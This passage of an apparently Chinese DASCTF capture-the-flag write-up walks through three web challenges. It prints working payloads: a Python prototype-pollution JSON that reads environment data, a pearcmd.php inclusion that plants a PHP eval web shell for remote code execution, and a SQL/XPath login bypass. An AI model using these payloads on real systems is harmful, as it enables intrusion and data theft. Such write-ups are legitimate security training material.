class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>审计发现有这个函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>百度后得知这是python的原型链污染。</p></li><li><p>通过分析，我们的目的是通过<code>/register</code>路由污染<code>__file__</code>变量，从而实现在<code>/</code>路由下的文件任意读取。</p></li><li><p>参考链接：<a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">https://www.cnblogs.com/Article-kelp/p/17068716.html</a></p></li><li><p>学习过程中发现，需要<code>__init__</code>来实现全局变量的污染，但测试发现<code>__init__</code>被过滤了。</p></li><li><p>通过Unicode编码<code>__init__</code>，实现了<code>__file__</code>的污染。</p><p>payload:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;/proc/1/environ&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><ol><li><p>打开环境，信息收集得到这个cms是<code>熊海cms V1.0</code>。</p></li><li><p>百度这个cms的漏洞，得到几个漏洞，分别是sql注入，文件包含，文件上传，文件任意下载，后台认证绕过。</p></li><li><p>尝试sql注入，用sqlmap一把梭，没找到flag，尝试日志写马，发现不行。</p></li><li><p>尝试文件上传，发现不能上传任何文件。</p></li><li><p>尝试文件任意下载，访问&#x2F;admin，用<code>admin:123456</code>登录进后台，选择<code>内容管理--下载列表</code>，点那个🖊的图标，进入修改页面。</p><p><img src="/DASCTF/ez_cms1.png"></p></li><li><p>在修改页面的文件位置填上文件的路径，然后点击保存。</p><p><img src="/DASCTF/ez_cms2.png"></p></li><li><p>返回一开始的页面，点🖊旁边的 √ 进入下载页面，然后点击联通下载，即可任意下载文件。</p><p><img src="/DASCTF/ez_cms3.png"></p></li><li><p>发现这里只能下载文件，但不知道flag在哪个文件，只能放弃。</p></li><li><p>文件包含功能，用上面的文件任意下载index.php的源码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//单一入口模式</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//关闭错误显示</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>分析得知，使用了<code>addslashes</code>做了过滤，因此无法使用伪协议，而且包含的时候拼接了<code>.php</code>，也没办法绕过。</p></li><li><p>使用<code>pearcmd.php</code>进行文件包含。（参考链接：<a href="https://blog.csdn.net/JCPS_Y/article/details/127541665%EF%BC%89">https://blog.csdn.net/JCPS_Y/article/details/127541665）</a></p></li><li><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;r=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></li><li><p>尝试过程中发现一直没有成功，猜测php的路径不对。</p></li><li><p>想到题目环境是用<code>doctor</code>搭的，是不是它们的php路径不一样呢？于是去打开个<code>doctor</code>去尝试一下，发现果然不一样。</p><p><img src="/DASCTF/ez_cms4.png"></p></li><li><p>于是修改路径为<code>/usr/share/php/pearcmd</code>，再次尝试，发现成功了。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;r=../../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><p><img src="/DASCTF/ez_cms5.png"></p></li><li><p>最后用r包含<code>/tmp/hello,php</code>，即可实现rce。</p><p><img src="/DASCTF/ez_cms6.png"></p></li><li><p>最后<code>cat /flag_you_find_ya</code>，即可得到flag。</p><p><img src="/DASCTF/ez_cms7.png"></p></li></ol><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><ol><li><p>万能密码登录，发现登录成功，再次登录一次，可以在源码中看到提示。(payload:<code>username=admin&#39;or 1=1 #</code>)</p><p><img src="/DASCTF/My1.png"></p></li><li><p>下载得到index.php的源码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>审计代码，发现能够上传文件。当<code>$_SESSION[&#39;user&#39;]</code>不为空且<code>file</code>不存在时，可以上传文件，而登录成功后，<code>$_SESSION[&#39;user&#39;]</code>就不为空了。</p></li><li><p>进一步发现，当<code>file</code>变量存在时，new了一个<code>FILE($filename);</code>。</p></li><li><p>查看这个类，发现这个类在<code>__destruct</code>时会将文件名当成命令来执行，而且在<code>__construct</code>时，会判断文件名是否只有一个<code>.</code>且没有<code>/</code>，同时还会判断文件是否存在。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>于是编写一个文件上传的页面，抓包，并将包修改一下。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">label</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;file&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#4CAF50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#45a049</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span 